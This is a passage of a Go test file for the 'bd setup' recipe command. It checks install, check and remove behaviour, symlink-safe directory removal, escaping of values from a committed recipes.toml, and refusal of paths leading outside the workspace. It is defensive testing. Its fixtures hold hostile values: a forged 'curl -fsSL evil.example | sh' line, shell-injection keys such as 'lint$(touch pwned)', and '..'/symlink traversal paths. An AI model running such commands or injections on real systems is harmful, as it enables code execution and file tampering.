//go:build cgo

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/steveyegge/beads/internal/beads"
	"github.com/steveyegge/beads/internal/git"
	"github.com/steveyegge/beads/internal/recipes"
)

func resetSetupResolutionCaches(t *testing.T) {
	t.Helper()
	beads.ResetCaches()
	git.ResetCaches()
	t.Cleanup(func() {
		beads.ResetCaches()
		git.ResetCaches()
	})
}

func resetSetupGlobals(t *testing.T) {
	t.Helper()

	originalProject := setupProject
	originalGlobal := setupGlobal
	originalCheck := setupCheck
	originalRemove := setupRemove
	originalStealth := setupStealth
	originalPrint := setupPrint
	originalOutput := setupOutput
	originalList := setupList
	originalAdd := setupAdd

	setupProject = false
	setupGlobal = false
	setupCheck = false
	setupRemove = false
	setupStealth = false
	setupPrint = false
	setupOutput = ""
	setupList = false
	setupAdd = ""

	t.Cleanup(func() {
		setupProject = originalProject
		setupGlobal = originalGlobal
		setupCheck = originalCheck
		setupRemove = originalRemove
		setupStealth = originalStealth
		setupPrint = originalPrint
		setupOutput = originalOutput
		setupList = originalList
		setupAdd = originalAdd
	})
}

func TestLoadSetupRecipes_NoWorkspaceUsesBuiltinsOnly(t *testing.T) {
	tmpDir := t.TempDir()
	orphanBeadsDir := filepath.Join(tmpDir, ".beads")
	if err := recipes.SaveUserRecipe(orphanBeadsDir, "myeditor", ".myeditor/rules.md"); err != nil {
		t.Fatalf("SaveUserRecipe: %v", err)
	}

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	allRecipes, usingWorkspaceRecipes, err := loadSetupRecipes()
	if err != nil {
		t.Fatalf("loadSetupRecipes: %v", err)
	}
	if usingWorkspaceRecipes {
		t.Fatal("expected built-in-only recipe set without an active workspace")
	}
	if _, ok := allRecipes["cursor"]; !ok {
		t.Fatal("expected built-in cursor recipe to be available")
	}
	if _, ok := allRecipes["myeditor"]; ok {
		t.Fatal("unexpected orphan custom recipe outside active workspace")
	}
}

func TestListRecipes_NoWorkspaceShowsBuiltinOnlyNote(t *testing.T) {
	tmpDir := t.TempDir()
	orphanBeadsDir := filepath.Join(tmpDir, ".beads")
	if err := recipes.SaveUserRecipe(orphanBeadsDir, "myeditor", ".myeditor/rules.md"); err != nil {
		t.Fatalf("SaveUserRecipe: %v", err)
	}

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	out := captureStdout(t, func() error {
		listRecipes()
		return nil
	})

	if !strings.Contains(out, "cursor") {
		t.Fatalf("expected built-in recipes in output, got:\n%s", out)
	}
	if !strings.Contains(out, "copilot") {
		t.Fatalf("expected copilot recipe in output, got:\n%s", out)
	}
	if strings.Contains(out, "myeditor") {
		t.Fatalf("unexpected orphan custom recipe in output:\n%s", out)
	}
	if !strings.Contains(out, "Note: No active beads workspace found. Showing built-in recipes only.") {
		t.Fatalf("expected built-in-only note in output, got:\n%s", out)
	}
	if !strings.Contains(out, "Hint: "+diagHint()) {
		t.Fatalf("expected diagnostic hint in output, got:\n%s", out)
	}
}

func TestAddRecipe_NoWorkspaceReturnsActiveWorkspaceError(t *testing.T) {
	tmpDir := t.TempDir()
	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	err := addRecipe("myeditor", ".myeditor/rules.md")
	if err == nil {
		t.Fatal("expected addRecipe to fail without active workspace")
	}
	if !strings.Contains(err.Error(), activeWorkspaceNotFoundError()) {
		t.Fatalf("expected active-workspace error, got: %v", err)
	}
	if !strings.Contains(err.Error(), diagHint()) {
		t.Fatalf("expected diagnostic hint, got: %v", err)
	}

	if _, statErr := os.Stat(filepath.Join(tmpDir, ".beads", "recipes.toml")); !os.IsNotExist(statErr) {
		t.Fatalf("expected no local recipes.toml, got err=%v", statErr)
	}
}

func TestLookupSetupRecipe_NoWorkspaceIgnoresOrphanCustomRecipes(t *testing.T) {
	tmpDir := t.TempDir()
	orphanBeadsDir := filepath.Join(tmpDir, ".beads")
	if err := recipes.SaveUserRecipe(orphanBeadsDir, "myeditor", ".myeditor/rules.md"); err != nil {
		t.Fatalf("SaveUserRecipe: %v", err)
	}

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	_, err := lookupSetupRecipe("myeditor")
	if err == nil {
		t.Fatal("expected custom recipe lookup to fail without active workspace")
	}
	if !strings.Contains(err.Error(), "workspace-local custom recipes require an active beads workspace") {
		t.Fatalf("expected explicit no-workspace message, got: %v", err)
	}
}

func TestRunRecipe_BuiltinFileRecipeWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()
	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	out := captureStdout(t, func() error {
		runRecipe("windsurf")
		return nil
	})

	if !strings.Contains(out, "Installing Windsurf integration") {
		t.Fatalf("expected install output, got:\n%s", out)
	}

	installedPath := filepath.Join(tmpDir, ".windsurf", "rules", "beads.md")
	data, err := os.ReadFile(installedPath)
	if err != nil {
		t.Fatalf("ReadFile(%q): %v", installedPath, err)
	}
	if string(data) != recipes.Template {
		t.Fatalf("installed recipe contents did not match template")
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".beads")); !os.IsNotExist(err) {
		t.Fatalf("expected no local .beads directory to be created, got err=%v", err)
	}
}

func TestRunRecipe_KiroWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()
	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	out := captureStdout(t, func() error {
		runRecipe("kiro")
		return nil
	})

	if !strings.Contains(out, "Installing Kiro CLI integration") {
		t.Fatalf("expected install output, got:\n%s", out)
	}

	installedPath := filepath.Join(tmpDir, ".kiro", "steering", "beads.md")
	data, err := os.ReadFile(installedPath)
	if err != nil {
		t.Fatalf("ReadFile(%q): %v", installedPath, err)
	}
	if string(data) != recipes.Template {
		t.Fatalf("installed Kiro recipe contents did not match template")
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".beads")); !os.IsNotExist(err) {
		t.Fatalf("expected no local .beads directory to be created, got err=%v", err)
	}
}

func TestRunRecipe_CopilotWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	out := captureStdout(t, func() error {
		runRecipe("copilot")
		return nil
	})

	if !strings.Contains(out, "GitHub Copilot CLI integration installed") {
		t.Fatalf("expected copilot install output, got:\n%s", out)
	}

	if _, err := os.Stat(filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")); err != nil {
		t.Fatalf("expected copilot plugin manifest: %v", err)
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".github", "copilot-instructions.md")); err != nil {
		t.Fatalf("expected copilot instructions: %v", err)
	}
}

func TestRunRecipe_CopilotCheckWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	runRecipe("copilot")

	resetSetupGlobals(t)
	setupCheck = true

	out := captureStdout(t, func() error {
		runRecipe("copilot")
		return nil
	})

	if !strings.Contains(out, ".copilot-plugin/plugin.json") {
		t.Fatalf("expected plugin manifest in check output, got:\n%s", out)
	}
	if !strings.Contains(out, ".github/copilot-instructions.md") {
		t.Fatalf("expected instructions file in check output, got:\n%s", out)
	}
}

func TestRunRecipe_CopilotRemoveWorksWithoutWorkspace(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	runRecipe("copilot")

	resetSetupGlobals(t)
	setupRemove = true
	runRecipe("copilot")

	if _, err := os.Stat(filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")); !os.IsNotExist(err) {
		t.Fatalf("expected plugin manifest to be removed, got err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".github", "copilot-instructions.md")); !os.IsNotExist(err) {
		t.Fatalf("expected copilot instructions to be removed, got err=%v", err)
	}
}

// Remove takes a file recipe's files out and then removes the directory each
// was in if that left it empty, but it never removes one that is a symlink,
// since that unlinks it whatever its target holds: a team's shared
// .windsurf/rules, say, or a .github holding workflows.
func TestRunRecipe_RemoveKeepsDirItDidNotEmpty(t *testing.T) {
	rules := filepath.Join(".windsurf", "rules")
	for _, tt := range []struct {
		name   string
		recipe string
		dir    string // the directory holding the recipe's file
		file   string // the recipe's file
		link   bool   // dir is a symlink to a directory beside the workspace
		mine   bool   // dir holds a file of the user's too
		bare   bool   // bd setup did not run first; dir is one the user made
		kept   bool
	}{
		{name: "linked .windsurf/rules holding a rule of the user's", recipe: "windsurf", dir: rules, file: "beads.md", link: true, mine: true, kept: true},
		{name: "linked .windsurf/rules holding only bd's rule", recipe: "windsurf", dir: rules, file: "beads.md", link: true, kept: true},
		{name: "linked .github holding workflows", recipe: "copilot", dir: ".github", file: "copilot-instructions.md", link: true, mine: true, kept: true},
		{name: "real .windsurf/rules holding a rule of the user's", recipe: "windsurf", dir: rules, file: "beads.md", mine: true, kept: true},
		{name: "real .windsurf/rules holding only bd's rule", recipe: "windsurf", dir: rules, file: "beads.md"},
		{name: "real empty .windsurf/rules, nothing installed", recipe: "windsurf", dir: rules, file: "beads.md", bare: true, kept: true},
	} {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			ws := filepath.Join(root, "ws")
			dir := filepath.Join(ws, tt.dir)
			target := dir
			if tt.link {
				target = filepath.Join(root, "shared")
			}
			for _, d := range []string{target, filepath.Dir(dir)} {
				if err := os.MkdirAll(d, 0o755); err != nil {
					t.Fatal(err)
				}
			}
			if tt.link {
				if err := os.Symlink(target, dir); err != nil {
					t.Skipf("symlink: %v", err)
				}
			}
			mine := filepath.Join(target, "mine.md")
			if tt.mine {
				if err := os.WriteFile(mine, []byte("mine\n"), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			t.Chdir(ws)
			t.Setenv("BEADS_DIR", "")
			resetSetupResolutionCaches(t)
			if !tt.bare {
				resetSetupGlobals(t)
				if err := runRecipe(tt.recipe); err != nil {
					t.Fatalf("bd setup %s: %v", tt.recipe, err)
				}
			}

			resetSetupGlobals(t)
			setupRemove = true
			if err := runRecipe(tt.recipe); err != nil {
				t.Fatalf("bd setup %s --remove: %v", tt.recipe, err)
			}
			if _, err := os.Lstat(filepath.Join(target, tt.file)); !os.IsNotExist(err) {
				t.Errorf("remove should remove bd's %s, lstat err = %v", tt.file, err)
			}
			if _, err := os.Stat(mine); tt.mine && err != nil {
				t.Errorf("remove should keep the user's %s: %v", mine, err)
			}
			info, err := os.Lstat(dir)
			switch {
			case !tt.kept:
				if !os.IsNotExist(err) {
					t.Errorf("remove should remove the emptied %s, lstat err = %v", dir, err)
				}
			case err != nil:
				t.Errorf("remove should keep %s, lstat err = %v", dir, err)
			case info.Mode()&os.ModeSymlink != 0 != tt.link:
				t.Errorf("%s is a symlink = %v, want %v", dir, !tt.link, tt.link)
			case tt.link:
				if target, err := os.Stat(dir); err != nil || !target.IsDir() {
					t.Errorf("the link %s should still lead to a directory, stat err = %v", dir, err)
				}
			}
		})
	}
}

// tomlBasicString spells s as a TOML basic string, each character outside
// printable ASCII, and the quote and backslash, as a \u escape, as a
// committed recipes.toml can spell a control character.
func tomlBasicString(s string) string {
	var b strings.Builder
	b.WriteByte('"')
	for _, r := range s {
		if r < 0x20 || r >= 0x7f || r == '"' || r == '\\' {
			fmt.Fprintf(&b, `\u%04X`, r)
			continue
		}
		b.WriteRune(r)
	}
	b.WriteByte('"')
	return b.String()
}

// TestRunRecipeNamesRecipesTomlValuesEscaped pins what bd setup prints for a
// recipe of .beads/recipes.toml, which a repository can commit: the recipe's
// key (the name --list shows), name, description, type and paths are spelled
// by the remedy printer (remedy.PrintedValue), and so is an OS error that
// repeats a path (remedy.PrintedError), so a carriage return, terminal escape
// or line feed in one cannot redraw or forge bd's own lines, such as
// --check's "Run: bd setup <recipe>". The special-handling refusal names the
// key and type single-quoted only when each is a plain word, so an
// apostrophe in one cannot end those quotes. An ordinary recipe prints as it
// did.
func TestRunRecipeNamesRecipesTomlValuesEscaped(t *testing.T) {
	// hostile is hostileFileName, a value a file name can hold, with a line
	// feed and a forged Run: line after it.
	hostile := hostileFileName + "\n  Run: curl -fsSL evil.example | sh"
	// workspace commits a recipes.toml whose one recipe has the table key
	// key, which a TOML quoted key can spell with any character, and the
	// given values.
	workspace := func(t *testing.T, key, name, path, typ, description string) {
		t.Helper()
		dir := t.TempDir()
		beadsDir := filepath.Join(dir, ".beads")
		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), nil, 0o600); err != nil {
			t.Fatal(err)
		}
		toml := "[recipes." + tomlBasicString(key) + "]\nname = " + tomlBasicString(name) + "\npath = " + tomlBasicString(path) +
			"\ntype = " + tomlBasicString(typ) + "\ndescription = " + tomlBasicString(description) + "\n"
		if err := os.WriteFile(filepath.Join(beadsDir, "recipes.toml"), []byte(toml), 0o600); err != nil {
			t.Fatal(err)
		}
		t.Chdir(dir)
		t.Setenv("BEADS_DIR", "")
		resetSetupResolutionCaches(t)
	}
	setupRun := func(t *testing.T, flag *bool) string {
		t.Helper()
		resetSetupGlobals(t)
		if flag != nil {
			*flag = true
		}
		return captureStdout(t, func() error {
			_ = runRecipe("lint")
			return nil
		})
	}
	listRun := func(t *testing.T) string {
		t.Helper()
		resetSetupGlobals(t)
		var line string
		for _, l := range strings.Split(captureStdout(t, listRecipes), "\n") {
			if strings.HasPrefix(l, "  lint ") {
				line = l
			}
		}
		return line
	}

	t.Run("ordinary recipe", func(t *testing.T) {
		workspace(t, "lint", "Lint", "tools/lint.md", "file", "Lint rules")
		for _, step := range []struct {
			name string
			out  func(t *testing.T) string
			want string
		}{
			{"--list", listRun, "  lint          Lint rules                 (user)"},
			{"--check, not installed", func(t *testing.T) string { return setupRun(t, &setupCheck) },
				"✗ Lint integration not installed\n  Run: bd setup lint\n  Missing: tools/lint.md\n"},
			{"install", func(t *testing.T) string { return setupRun(t, nil) },
				"Installing Lint integration...\n\n✓ Lint integration installed\n  File: tools/lint.md\n"},
			{"--check, installed", func(t *testing.T) string { return setupRun(t, &setupCheck) },
				"✓ Lint integration installed\n  File: tools/lint.md\n"},
			{"--remove", func(t *testing.T) string { return setupRun(t, &setupRemove) }, "✓ Removed Lint integration\n"},
		} {
			if got := step.out(t); got != step.want {
				t.Errorf("bd setup %s printed\n%q\nwant\n%q", step.name, got, step.want)
			}
		}
	})

	t.Run("hostile recipe", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("a Windows file name cannot hold a control character")
		}
		workspace(t, "lint", hostile, filepath.Join("tools", hostile), "file", hostile)
		for _, step := range []struct {
			name string
			out  func(t *testing.T) string
		}{
			{"--list", listRun},
			{"--check, not installed", func(t *testing.T) string { return setupRun(t, &setupCheck) }},
			{"install", func(t *testing.T) string { return setupRun(t, nil) }},
			{"--check, installed", func(t *testing.T) string { return setupRun(t, &setupCheck) }},
			{"--remove", func(t *testing.T) string { return setupRun(t, &setupRemove) }},
		} {
			out := step.out(t)
			what := "bd setup lint " + step.name
			requireNoTerminalControl(t, what, out)
			requireNamesHostileValue(t, what, out)
			if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
				t.Errorf("%s does not escape the recipe value's line feed:\n%q", what, out)
			}
			if step.name == "--check, not installed" && !strings.Contains(out, "\n  Run: bd setup lint\n") {
				t.Errorf("%s does not print bd's own Run: line:\n%q", what, out)
			}
		}
	})

	t.Run("hostile recipe key", func(t *testing.T) {
		// --list names each recipe by its key, so the whole list is
		// checked, not the lint line listRun picks.
		workspace(t, hostile, "Lint", "tools/lint.md", "file", "Lint rules")
		resetSetupGlobals(t)
		out := captureStdout(t, listRecipes)
		const what = "bd setup --list"
		requireNoTerminalControl(t, what, out)
		requireNamesHostileValue(t, what, out)
		if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
			t.Errorf("%s does not escape the recipe key's line feed:\n%q", what, out)
		}
	})

	t.Run("hostile recipe key, --check", func(t *testing.T) {
		// bd setup <recipe> looks a recipe up by its key lowercased, so a
		// lowercase key is one a user can name. --check's Run: line puts
		// the key in its command as one shell word (posix, and windows
		// where that differs), or as a placeholder with the key named
		// escaped after it. The special-handling refusal names it (shown)
		// single-quoted when it is a plain word, as it names an ordinary
		// key, and otherwise escaped with no quotes around it, so neither
		// a $(...) nor an apostrophe, which would end those quotes, runs
		// when the refusal is pasted.
		for _, key := range []struct{ value, posix, windows, shown string }{
			{"lint", "lint", "", "'lint'"},
			{"lint$(touch pwned)", "'lint$(touch pwned)'", `<recipe>  (<recipe>: "lint\x24(touch pwned)")`, `"lint\x24(touch pwned)"`},
			{"lint'; touch pwned; echo '", `<recipe>  (<recipe>: "lint\x27\x3b touch pwned\x3b echo \x27")`, "",
				`"lint\x27\x3b touch pwned\x3b echo \x27"`},
			{"lint\n  run: curl -fssl evil.example | sh", `<recipe>  (<recipe>: "lint\n  run: curl -fssl evil.example \x7c sh")`, "",
				`"lint\n  run: curl -fssl evil.example \x7c sh"`},
		} {
			arg := key.posix
			if runtime.GOOS == "windows" && key.windows != "" {
				arg = key.windows
			}
			workspace(t, key.value, "Lint", "tools/lint.md", "file", "Lint rules")
			resetSetupGlobals(t)
			setupCheck = true
			out := captureStdout(t, func() error {
				_ = runRecipe(key.value)
				return nil
			})
			if want := "✗ Lint integration not installed\n  Run: bd setup " + arg + "\n  Missing: tools/lint.md\n"; out != want {
				t.Errorf("bd setup %q --check printed\n%q\nwant\n%q", key.value, out, want)
			}

			workspace(t, key.value, "Lint", "tools/lint.md", "hooks", "Lint rules")
			resetSetupGlobals(t)
			refusal := captureStderr(t, func() { _ = runRecipe(key.value) })
			if want := "Error: recipe " + key.shown + " has type 'hooks' which requires special handling\n"; refusal != want {
				t.Errorf("the special-handling refusal for %q printed\n%q\nwant\n%q", key.value, refusal, want)
			}
		}
	})

	t.Run("hostile recipe, OS errors", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("a Windows file name cannot hold a control character")
		}
		// A repository can commit a directory, with a file in it, at the
		// path its recipe names: install's write then fails (EISDIR) and
		// --remove's remove (ENOTEMPTY). It can commit a file where the
		// path's directory would go: install's mkdir then fails (ENOTDIR).
		// Each OS error repeats the path.
		for _, step := range []struct {
			name, path, file string
			flag             *bool
		}{
			{"install, write", filepath.Join("tools", hostile), filepath.Join("tools", hostile, "kept"), nil},
			{"--remove", filepath.Join("tools", hostile), filepath.Join("tools", hostile, "kept"), &setupRemove},
			{"install, create directory", filepath.Join(hostile, "lint.md"), hostile, nil},
		} {
			workspace(t, "lint", "Lint", step.path, "file", "Lint rules")
			if err := os.MkdirAll(filepath.Dir(step.file), 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(step.file, nil, 0o600); err != nil {
				t.Fatal(err)
			}
			resetSetupGlobals(t)
			if step.flag != nil {
				*step.flag = true
			}
			var err error
			stdout, stderr := captureStdio(t, func() { err = runRecipe("lint") })
			what := "bd setup lint " + step.name
			if err == nil {
				t.Errorf("%s succeeded; want it to fail on the committed %s", what, step.file)
			}
			requireNoTerminalControl(t, what, stdout+stderr)
			requireNamesHostileValue(t, what, stderr)
			if strings.Contains(stderr, "\n  Run: curl") || !strings.Contains(stderr, `\n  Run: curl`) {
				t.Errorf("%s does not escape the recipe path's line feed in its error:\n%q", what, stderr)
			}
		}
	})

	t.Run("hostile path outside the directory", func(t *testing.T) {
		// The refusal of a path outside the directory bd setup runs in
		// names the key and the path as the special-handling refusal names
		// the key and type: a path that is not a plain word is escaped.
		path := ".." + string(filepath.Separator) + hostile
		for _, step := range []struct {
			name string
			flag *bool
		}{{"install", nil}, {"--check", &setupCheck}, {"--remove", &setupRemove}} {
			workspace(t, "lint", "Lint", path, "file", "Lint rules")
			resetSetupGlobals(t)
			if step.flag != nil {
				*step.flag = true
			}
			var err error
			stdout, stderr := captureStdio(t, func() { err = runRecipe("lint") })
			what := "bd setup lint " + step.name
			if err == nil || stdout != "" {
				t.Errorf("%s: err %v, stdout %q; want a refusal", what, err, stdout)
			}
			requireNoTerminalControl(t, what, stderr)
			requireNamesHostileValue(t, what, stderr)
			if want := "Error: recipe 'lint' names " + recipeRefusalWord(path) + ", which is not inside the directory bd setup runs in\n"; !strings.HasPrefix(stderr, want) {
				t.Errorf("%s printed\n%q\nwant it to start with\n%q", what, stderr, want)
			}
		}
	})

	t.Run("hostile type", func(t *testing.T) {
		workspace(t, "lint", "Lint", "tools/lint.md", hostile, "Lint rules")
		resetSetupGlobals(t)
		setupCheck = true
		out := captureStderr(t, func() { _ = runRecipe("lint") })
		requireNoTerminalControl(t, "bd setup lint --check, special-handling refusal", out)
		if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
			t.Errorf("the special-handling refusal does not escape the recipe type's line feed:\n%q", out)
		}

		// An apostrophe in the type would end the single quotes an ordinary
		// type is named in, so the type is named escaped instead.
		workspace(t, "lint", "Lint", "tools/lint.md", "hooks'; touch pwned; echo '", "Lint rules")
		resetSetupGlobals(t)
		out = captureStderr(t, func() { _ = runRecipe("lint") })
		if want := `Error: recipe 'lint' has type "hooks\x27\x3b touch pwned\x3b echo \x27" which requires special handling` + "\n"; out != want {
			t.Errorf("the special-handling refusal for a type holding an apostrophe printed\n%q\nwant\n%q", out, want)
		}
	})
}

// TestRunRecipe_WorkspaceRecipePathsStayInside pins that bd setup refuses a
// recipe of .beads/recipes.toml, which a repository can commit, when a path
// it names is not inside the directory bd setup runs in
// (recipes.PathInside): an absolute path, one that leaves the directory
// through .., or one that leads out of it through a symbolic link (a linked
// directory, a linked file, a .. after a linked directory, or a directory
// install would create or --remove would drop), and one that runs through a
// link bd setup cannot follow (a dangling one). The refusal comes before
// --check reads, install writes or --remove deletes any of the recipe's
// files or directories, a multifile recipe's inside paths included, and
// names the key and the path. A custom recipe and one overriding a built-in are refused
// alike. An ordinary recipe, one whose path runs through a link inside the
// directory, and a built-in recipe run as before.
func TestRunRecipe_WorkspaceRecipePathsStayInside(t *testing.T) {
	// workspace makes base/ws a workspace whose recipes.toml is toml, with
	// the links given, base/outside/victim.md beside it and ws/sub/kept.md
	// and ws/sub/deep/ in it, and runs bd setup in ws.
	workspace := func(t *testing.T, toml string, links map[string]string) (ws, outside string) {
		t.Helper()
		base := t.TempDir()
		ws, outside = filepath.Join(base, "ws"), filepath.Join(base, "outside")
		for _, d := range []string{filepath.Join(ws, ".beads"), filepath.Join(ws, "sub", "deep"), outside} {
			if err := os.MkdirAll(d, 0o750); err != nil {
				t.Fatal(err)
			}
		}
		for path, data := range map[string]string{
			filepath.Join(ws, ".beads", "config.yaml"):  "",
			filepath.Join(ws, ".beads", "recipes.toml"): toml,
			filepath.Join(ws, "sub", "kept.md"):         "kept\n",
			filepath.Join(outside, "victim.md"):         "victim\n",
		} {
			if err := os.WriteFile(path, []byte(data), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		for link, target := range links {
			if err := os.Symlink(filepath.FromSlash(target), filepath.Join(ws, filepath.FromSlash(link))); err != nil {
				t.Skipf("symlink: %v", err)
			}
		}
		t.Chdir(ws)
		t.Setenv("BEADS_DIR", "")
		resetSetupResolutionCaches(t)
		return ws, outside
	}
	modes := []struct {
		name string
		flag *bool
	}{{"install", nil}, {"--check", &setupCheck}, {"--remove", &setupRemove}}
	// listing names every entry under dir, so a test sees one created or
	// removed there.
	listing := func(t *testing.T, dir string) []string {
		t.Helper()
		var names []string
		if err := filepath.WalkDir(dir, func(path string, _ os.DirEntry, err error) error {
			names = append(names, path)
			return err
		}); err != nil {
			t.Fatal(err)
		}
		return names
	}
	const outsideWhy = "is not inside the directory bd setup runs in"

	for _, tt := range []struct {
		name, recipe string
		toml         func(outside string) string
		links        map[string]string
		named        func(outside string) string // the path the refusal names
		why          string                      // why it is refused; outsideWhy if empty
		prepare      func(t *testing.T, ws, outside string)
	}{
		{
			name: "custom recipe, absolute path", recipe: "lint",
			toml: func(o string) string {
				return "[recipes.lint]\npath = " + tomlBasicString(filepath.Join(o, "victim.md")) + "\n"
			},
			named: func(o string) string { return filepath.Join(o, "victim.md") },
		},
		{
			name: "windsurf override, .. path", recipe: "windsurf",
			toml: func(string) string {
				return "[recipes.windsurf]\npath = " + tomlBasicString(filepath.Join("..", "outside", "victim.md")) + "\n"
			},
			named: func(string) string { return filepath.Join("..", "outside", "victim.md") },
		},
		{
			name: "kiro override, linked directory", recipe: "kiro",
			toml:  func(string) string { return "[recipes.kiro]\npath = \"up/outside/victim.md\"\n" },
			links: map[string]string{"up": ".."},
			named: func(string) string { return "up/outside/victim.md" },
		},
		{
			// The OS takes .. after a linked directory to the parent of the
			// link's target, not of the link: o/../outside/victim.md, which
			// cleans to a name inside, is the outside victim.md.
			name: "kiro override, .. after a linked directory", recipe: "kiro",
			toml:  func(string) string { return "[recipes.kiro]\npath = \"o/../outside/victim.md\"\n" },
			links: map[string]string{"o": "../outside"},
			named: func(string) string { return "o/../outside/victim.md" },
		},
		{
			name: "cody override, linked file", recipe: "cody",
			toml:  func(string) string { return "[recipes.cody]\npath = \"sub/beads.md\"\n" },
			links: map[string]string{"sub/beads.md": "../../outside/victim.md"},
			named: func(string) string { return "sub/beads.md" },
		},
		{
			// Windows cleans .. away before it follows links, so it opens
			// x/../sub/beads.md as sub/beads.md, the linked file.
			name: "cody override, cleaned path a linked file", recipe: "cody",
			toml:  func(string) string { return "[recipes.cody]\npath = \"x/../sub/beads.md\"\n" },
			links: map[string]string{"x": "sub/deep", "sub/beads.md": "../../outside/victim.md"},
			named: func(string) string { return "x/../sub/beads.md" },
		},
		{
			name: "kilocode override, dangling link", recipe: "kilocode",
			toml:  func(string) string { return "[recipes.kilocode]\npath = \"sub/beads.md\"\n" },
			links: map[string]string{"sub/beads.md": "../../outside/new.md"},
			named: func(string) string { return "sub/beads.md" },
			why:   "runs through a symbolic link bd setup cannot follow",
		},
		{
			// The OS walks x/../up/outside/empty/beads.md to
			// sub/up/outside/empty/beads.md, inside, but the directory
			// install creates and --remove drops when empty is
			// filepath.Dir of the path, up/outside/empty: the outside
			// empty/ directory.
			name: "kiro override, directory leading out", recipe: "kiro",
			toml:  func(string) string { return "[recipes.kiro]\npath = \"x/../up/outside/empty/beads.md\"\n" },
			links: map[string]string{"x": "sub/deep", "up": ".."},
			named: func(string) string { return "x/../up/outside/empty/beads.md" },
			prepare: func(t *testing.T, ws, outside string) {
				// --remove has a file to remove inside, and an empty
				// directory outside that removing it would leave empty.
				for _, d := range []string{filepath.Join(ws, "sub", "up", "outside", "empty"), filepath.Join(outside, "empty")} {
					if err := os.MkdirAll(d, 0o750); err != nil {
						t.Fatal(err)
					}
				}
				if err := os.WriteFile(filepath.Join(ws, "sub", "up", "outside", "empty", "beads.md"), nil, 0o600); err != nil {
					t.Fatal(err)
				}
			},
		},
		{
			name: "kiro override, directory install would create outside", recipe: "kiro",
			toml:  func(string) string { return "[recipes.kiro]\npath = \"x/../up/outside/newdir/beads.md\"\n" },
			links: map[string]string{"x": "sub/deep", "up": ".."},
			named: func(string) string { return "x/../up/outside/newdir/beads.md" },
		},
		{
			name: "copilot override, multifile", recipe: "copilot",
			toml: func(string) string {
				return "[recipes.copilot]\ntype = \"multifile\"\npaths = [\"sub/kept.md\", " + tomlBasicString(filepath.Join("..", "outside", "victim.md")) + "]\n"
			},
			named: func(string) string { return filepath.Join("..", "outside", "victim.md") },
		},
	} {
		for _, mode := range modes {
			t.Run(tt.name+" "+mode.name, func(t *testing.T) {
				ws, outside := workspace(t, "", tt.links)
				if err := os.WriteFile(filepath.Join(ws, ".beads", "recipes.toml"), []byte(tt.toml(outside)), 0o600); err != nil {
					t.Fatal(err)
				}
				if tt.prepare != nil {
					tt.prepare(t, ws, outside)
				}
				before := listing(t, outside)
				resetSetupGlobals(t)
				if mode.flag != nil {
					*mode.flag = true
				}
				var err error
				stdout, stderr := captureStdio(t, func() { err = runRecipe(tt.recipe) })
				what := "bd setup " + tt.recipe + " " + mode.name
				if err == nil {
					t.Errorf("%s succeeded; want a refusal", what)
				}
				why := tt.why
				if why == "" {
					why = outsideWhy
				}
				want := "Error: recipe '" + tt.recipe + "' names " + recipeRefusalWord(tt.named(outside)) +
					", which " + why + "\n" +
					"Hint: a .beads/recipes.toml recipe can only name a relative path with no '..' or symbolic link leading out of the directory bd setup runs in, and no dangling or looping link along it\n"
				if stdout != "" || stderr != want {
					t.Errorf("%s printed\nstdout %q\nstderr %q\nwant stderr %q", what, stdout, stderr, want)
				}
				for path, data := range map[string]string{
					filepath.Join(outside, "victim.md"): "victim\n",
					filepath.Join(ws, "sub", "kept.md"): "kept\n",
				} {
					if got, err := os.ReadFile(path); err != nil || string(got) != data {
						t.Errorf("%s changed %s: %q, %v", what, path, got, err)
					}
				}
				if after := listing(t, outside); !slices.Equal(after, before) {
					t.Errorf("%s changed %s: entries %q, were %q", what, outside, after, before)
				}
			})
		}
	}

	t.Run("ordinary recipes run as before", func(t *testing.T) {
		for _, tt := range []struct {
			name, recipe, toml, file string
			links                    map[string]string
		}{
			{name: "custom recipe", recipe: "lint", toml: "[recipes.lint]\npath = \"tools/lint.md\"\n", file: "tools/lint.md"},
